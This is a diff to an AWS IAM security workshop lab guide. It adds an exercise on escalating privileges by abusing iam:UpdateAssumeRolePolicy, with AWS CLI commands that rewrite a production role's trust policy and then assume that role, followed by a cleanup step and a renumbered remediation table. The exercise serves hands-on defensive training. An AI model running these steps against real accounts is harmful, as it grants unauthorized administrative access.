@@ -224,18 +224,90 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
 ---
 
+## Exercise 4: Scenario 3 - UpdateAssumeRolePolicy (Principal Access)
+
+The `iamws-integration-admin-user` can modify trust policies on any role, allowing them to assume privileged roles.
+
+### Part A: Identify with pmapper
+
+Query for users who can update trust policies:
+
+```bash
+pmapper query "who can do iam:UpdateAssumeRolePolicy with *"
+```
+
+Look for this line:
+```
+user/iamws-integration-admin-user IS authorized to call action iam:UpdateAssumeRolePolicy for resource *
+```
+
+### Part B: Understand via pathfinding.cloud
+
+1. Navigate to [pathfinding.cloud IAM-012](https://pathfinding.cloud/paths/iam-012)
+2. Review the **Attack Steps** section
+
+### Part C: Exploit
+
+Modify a role's trust policy to allow the attacker to assume it:
+
+```bash
+# Get credentials for the vulnerable user
+export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s" \
+  $(aws sts assume-role \
+    --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/iamws-integration-admin-role \
+    --role-session-name exploit \
+    --query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" \
+    --output text))
+
+# Verify identity
+aws sts get-caller-identity
+
+# Get current trust policy of the admin role
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+aws iam get-role --role-name iamws-prod-deploy-role --query 'Role.AssumeRolePolicyDocument'
+
+# Update trust policy to allow our role to assume it
+aws iam update-assume-role-policy \
+  --role-name iamws-prod-deploy-role \
+  --policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::'$ACCOUNT_ID':role/iamws-integration-admin-role"
+      },
+      "Action": "sts:AssumeRole"
+    }]
+  }'
+
+# Now assume the privileged role
+aws sts assume-role \
+  --role-arn arn:aws:iam::$ACCOUNT_ID:role/iamws-prod-deploy-role \
+  --role-session-name escalated
+```
+
+### Cleanup
+
+Reset the trust policy (instructor will handle this) and reset credentials:
+
+```bash
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+```
+
+---
+
 ## Wrap-up
 
 ### Summary: Findings to Fencin' the Frontier Remediations
 
-| Finding | Category | Fencin' the Frontier Exercise | Guardrail |
+| Finding | Category | Lab 2 Exercise | Guardrail |
 |---------|----------|----------------|-----------|
 | AttachUserPolicy | Self-Escalation | Exercise 1 | **Permissions Boundary** |
-| UpdateAssumeRolePolicy | Principal Access | Exercise 2 | **Trust Policy (Resource Policy)** |
-| PassRole + EC2 | New PassRole | Exercise 3 | **Condition Key** |
-| CreateAccessKey | Principal Access | Exercise 4 | **Resource Constraint** |
+| CreateAccessKey | Principal Access | Exercise 2 | **Resource Constraint** |
+| UpdateAssumeRolePolicy | Principal Access | Exercise 3 | **Trust Policy** |
+| PassRole + EC2 | New PassRole | Exercise 4 | **Condition Key** |
 
-In the next lab, you will apply guardrails to the vulnerable infrastructure to remediate the privilege escalation paths.
+Continue to **Lab 2 - Fencin' the Frontier** to apply guardrails and remediate these vulnerabilities.
 
 ---
 
